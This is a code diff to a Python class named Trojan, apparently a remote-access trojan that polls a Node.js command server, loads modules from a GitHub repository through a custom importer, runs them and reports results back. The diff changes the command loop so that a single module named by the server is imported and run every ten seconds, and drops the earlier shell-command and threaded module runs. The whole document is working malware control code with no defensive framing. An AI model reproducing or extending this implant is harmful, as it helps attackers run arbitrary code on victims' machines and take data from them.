@@ -28,6 +28,7 @@ class Trojan:
         self.repo = github_connect()
         self.node_server_url = node_server_url
         self.running = True
+        self.module_to_run = None
 
     def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
@@ -69,11 +70,13 @@ class Trojan:
             result = e.output.decode('utf-8')
         self.send_command_result(command, result)
 
-    def module_runner(self, module):
-        if module not in sys.modules:
-            importlib.import_module(module)
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+    def module_runner(self):
+        if self.module_to_run:
+            if self.module_to_run not in sys.modules:
+                importlib.import_module(self.module_to_run)
+            result = sys.modules[self.module_to_run].run()
+            self.store_module_result(result)
+            self.module_to_run = None  # Clear after execution
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
@@ -92,22 +95,13 @@ class Trojan:
                     self.update_status("Trojan stopped.")
                     break
 
-                # Execute commands from Node.js server
-                for command in nodejs_config.get('commands', []):
-                    self.execute_command(command)
+                # Update module to run based on received commands
+                self.module_to_run = nodejs_config.get('module')
 
-            # Run modules based on GitHub config
-            github_config = self.get_github_config()
-            if isinstance(github_config, list):
-                for task in github_config:
-                    module = task.get('module')
-                    if module and module not in sys.modules:
-                        importlib.import_module(module)
-                    thread = threading.Thread(target=self.module_runner, args=(module,))
-                    thread.start()
-                    time.sleep(random.randint(1, 10))
+            # Run the module if set
+            self.module_runner()
 
-            time.sleep(10)  # Adjust polling interval as needed
+            time.sleep(10)  # Check for commands every 10 seconds
 
 class GitImporter:
     def __init__(self):
